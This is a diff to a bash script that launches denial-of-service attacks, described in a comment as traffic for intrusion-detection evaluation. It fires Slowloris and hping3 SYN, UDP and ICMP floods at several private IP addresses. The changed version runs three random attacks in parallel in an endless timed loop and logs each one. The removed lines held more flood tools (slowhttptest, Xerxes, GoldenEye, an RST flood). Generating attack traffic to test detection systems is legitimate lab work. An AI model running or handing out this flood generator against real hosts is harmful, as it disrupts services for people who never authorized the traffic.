@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Target IP
-TARGET_IP="192.168.36.1"
+# List of target IPs for IDS evaluation
+TARGET_IPS=("192.168.36.1" "192.168.36.2" "192.168.36.3")  # Add more IPs if needed
 
 # Log file with timestamped name
 LOG_FILE="dos_log_$(date '+%Y%m%d').txt"
@@ -9,91 +9,66 @@ LOG_FILE="dos_log_$(date '+%Y%m%d').txt"
 # Function to log attacks
 log_attack() {
     local attack_name=$1
-    local duration=$2
-    echo "$(date '+%Y-%m-%d %H:%M:%S') - Executed $attack_name on $TARGET_IP for ${duration}s" >> "$LOG_FILE"
+    local target_ip=$2
+    local duration=$3
+    echo "$(date '+%Y-%m-%d %H:%M:%S') - Executed $attack_name on $target_ip for ${duration}s" >> "$LOG_FILE"
 }
 
-# Function to run Slowloris DoS attack
+# Function to run Slowloris attack
 run_slowloris() {
-    TIMEOUT=$((RANDOM % 61 + 120))  
-    timeout $TIMEOUT slowloris $TARGET_IP &> /dev/null &
-    log_attack "Slowloris" "$TIMEOUT"
+    local target_ip=$1
+    TIMEOUT=$((RANDOM % 61 + 120))
+    timeout $TIMEOUT slowloris $target_ip &> /dev/null &
+    log_attack "Slowloris" "$target_ip" "$TIMEOUT"
 }
 
 # Function to run Hping3 (TCP SYN flood)
 run_hping3() {
-    TIMEOUT=$((RANDOM % 61 + 120))  
-    timeout $TIMEOUT hping3 --flood -S $TARGET_IP -p 80 &> /dev/null &
-    log_attack "Hping3 SYN Flood" "$TIMEOUT"
+    local target_ip=$1
+    TIMEOUT=$((RANDOM % 61 + 120))
+    timeout $TIMEOUT hping3 --flood -S $target_ip -p 80 &> /dev/null &
+    log_attack "Hping3 SYN Flood" "$target_ip" "$TIMEOUT"
 }
 
-# Function to run SYN flood attack using Hping3
-run_synflood() {
-    hping3 -i u40 -S -p 80 -c 100000 $TARGET_IP &> /dev/null &
-    log_attack "SYN Flood" "N/A"
-}
-
-# Function to run Slowhttptest (Slow HTTP DoS)
-run_slowhttptest() {
-    TIMEOUT=$((RANDOM % 61 + 120))  
-    timeout $TIMEOUT slowhttptest -c 100 -i 10 -r 200 -t GET -p 80 -u http://$TARGET_IP &> /dev/null &
-    log_attack "Slowhttptest" "$TIMEOUT"
-}
-
-# Function to run UDP flood attack using Hping3
+# Function to run UDP flood attack
 run_udpflood() {
-    TIMEOUT=$((RANDOM % 61 + 120))  
-    timeout $TIMEOUT hping3 --flood --udp $TARGET_IP -p 53 &> /dev/null &
-    log_attack "UDP Flood" "$TIMEOUT"
-}
-
-# Function to run Xerxes (HTTP DoS attack)
-run_xerxes() {
-    TIMEOUT=$((RANDOM % 61 + 120))  
-    timeout $TIMEOUT ./xerxes $TARGET_IP 80 &> /dev/null &
-    log_attack "Xerxes" "$TIMEOUT"
-}
-
-# Function to run GoldenEye (HTTP DoS attack)
-run_goldeneye() {
-    TIMEOUT=$((RANDOM % 61 + 120)) 
-    timeout $TIMEOUT python3 goldeneye.py http://$TARGET_IP &> /dev/null &
-    log_attack "GoldenEye" "$TIMEOUT"
+    local target_ip=$1
+    TIMEOUT=$((RANDOM % 61 + 120))
+    timeout $TIMEOUT hping3 --flood --udp $target_ip -p 53 &> /dev/null &
+    log_attack "UDP Flood" "$target_ip" "$TIMEOUT"
 }
 
 # Function to run ICMP Flood attack
 run_icmp_flood() {
+    local target_ip=$1
     TIMEOUT=$((RANDOM % 61 + 120))
-    timeout $TIMEOUT hping3 --flood --icmp $TARGET_IP &> /dev/null &
-    log_attack "ICMP Flood" "$TIMEOUT"
+    timeout $TIMEOUT hping3 --flood --icmp $target_ip &> /dev/null &
+    log_attack "ICMP Flood" "$target_ip" "$TIMEOUT"
 }
 
-# Function to run TCP RST Flood attack
-run_rst_flood() {
-    TIMEOUT=$((RANDOM % 61 + 120)) 
-    timeout $TIMEOUT hping3 -R --flood $TARGET_IP -p 80 &> /dev/null &
-    log_attack "TCP RST Flood" "$TIMEOUT"
-}
-
-# Main function to run DoS attacks continuously
+# Main function to run simultaneous attacks
 main() {
     echo "Logging DoS attacks to $LOG_FILE"
 
-    # List of available attack functions
-    ATTACKS=(
-        "run_slowloris" "run_hping3" "run_synflood" "run_slowhttptest"
-        "run_udpflood" "run_xerxes" "run_goldeneye" "run_icmp_flood" 
-        "run_rst_flood"
-    )
+    # List of attack functions
+    ATTACKS=("run_slowloris" "run_hping3" "run_udpflood" "run_icmp_flood")
 
     while true; do
-        # Select a random attack
-        ATTACK=${ATTACKS[$RANDOM % ${#ATTACKS[@]}]}
+        # Pick 3 unique random target IPs
+        SELECTED_IPS=($(shuf -e "${TARGET_IPS[@]}" -n 3))
 
-        # Execute the selected attack
-        $ATTACK
+        # Pick 3 different random attacks
+        SELECTED_ATTACKS=($(shuf -e "${ATTACKS[@]}" -n 3))
 
-        # Random delay greater than 180 seconds
+        # Execute attacks in parallel
+        for i in {0..2}; do
+            TARGET_IP="${SELECTED_IPS[$i]}"
+            ATTACK="${SELECTED_ATTACKS[$i]}"
+            echo "Attacking $TARGET_IP with $ATTACK"
+            $ATTACK "$TARGET_IP" &
+        done
+
+        # Wait before next batch of attacks
         RANDOM_DELAY=$((RANDOM % 101 + 200))
         sleep $RANDOM_DELAY
     done
